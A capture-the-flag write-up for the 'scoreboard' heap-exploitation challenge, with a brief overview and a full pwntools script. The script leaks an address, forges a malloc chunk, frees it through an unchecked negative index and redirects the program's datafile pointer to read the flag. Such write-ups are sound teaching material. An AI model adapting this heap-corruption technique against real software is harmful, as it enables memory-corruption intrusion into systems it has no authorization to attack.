# scoreboard

## Question

> we were just searching on shodan and we found the scoreboard for a football stadium. can you open the flag file?  
> GLIBC 2.27-3ubuntu1  
> compiled with gcc -no-pie -g pwn.c -o pwn  
> connect using nc pwn.osucyber.club 13381

## Solution (by b01lers)

The overview of this is: fake a malloc struct, free it using the unchecked index, have it's next return a fake chunk that points to the file address. Then read from that file with reset and show.

Super gross solve script

```
from pwn import *

#p = process('./pwn')
#gdb.attach(p, """
#c
#""")
p  = remote('pwn.osucyber.club', 13381)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Leak some player address
# Overwrite all team members with the address
# Forge a chunk and free it
# Set fd pointer of forged chunk to
# Allocate with pointer to datafile

default_datafile_addr = 0x602280
team_name_addr = 0x602380
team2_name_addr = 0x6020e0

p.sendline('team') # Just set team stuffs
p.sendline('0')
p.sendline('A'*8 + 'B'*9+'\x00'*8)
p.sendline('B')

for i in range(11):
    p.sendline('substitution')
    p.sendline('0')
    p.sendline(str(i))
    p.sendline('name_{}'.format(i))
    p.sendline(str(i))

for i in range(11):
    p.sendline('substitution')
    p.sendline('1')
    p.sendline(str(i))
    p.sendline('team2_name_{}'.format(i))
    p.sendline(str(i))


p.sendline('substitution') # This address should now be in name+4
p.sendline('0')
p.sendline('-4')
p.sendline('AAAA')
p.sendline('14')

p.recv(timeout=1)
p.recv(timeout=1)
p.recv(timeout=1)
p.recv(timeout=1)
p.recv(timeout=1)
p.recv(timeout=1)
p.recv(timeout=1)
p.recv(timeout=1)
p.recv(timeout=1)
p.recv(timeout=1)
p.recv(timeout=1)
p.recv(timeout=1)

p.sendline('show')
p.recvuntil('AAAAAAAABBBBBBBB')
leak = p.recvuntil(':')[:-1]
leak = u64(leak.ljust(8, b'\x00'))
print(hex(leak))

p.sendline('team') # Just set team stuffs
p.sendline('1')
forged_chunk_addr = team2_name_addr + 8 + 8
forged_chunk = b''
forged_chunk += p64(0x50) # size
forged_chunk += p64(default_datafile_addr) #next
forged_chunk += p64(default_datafile_addr) #next
payload = forged_chunk
#while len(payload)/8 < 11:
#    payload += b'\x00' * 8
p.sendline(b'\x00' * 8 + forged_chunk)
p.sendline('A'*4)
p.sendline('B')


p.sendline('team')
p.sendline('longteamname')
payload = b''
payload += b'A' * 4
payload += b'\x00' * 4
payload += p64(forged_chunk_addr) # write to team[0].players[-1]
payload += p64(leak) * 9 # leak
p.sendline(payload)

# Get thing freed
p.sendline('substitution')
p.sendline('0')
p.sendline('-1')
p.sendline('AAAA')
p.sendline('14')

p.sendline('team') # Just set team stuffs
p.sendline('1')
p.sendline(b'AAAAAAAA' + p64(0x50) + p64(default_datafile_addr))
p.sendline(b'BBBBBBBB')

p.sendline('substitution')
p.sendline('0')
p.sendline('20')
p.sendline('flag')
p.sendline('13')

p.sendline('substitution')
p.sendline('0')
p.sendline('21')
p.sendline('flag')
p.sendline('13')

p.sendline('reset')

p.sendline('show')

p.interactive()
```
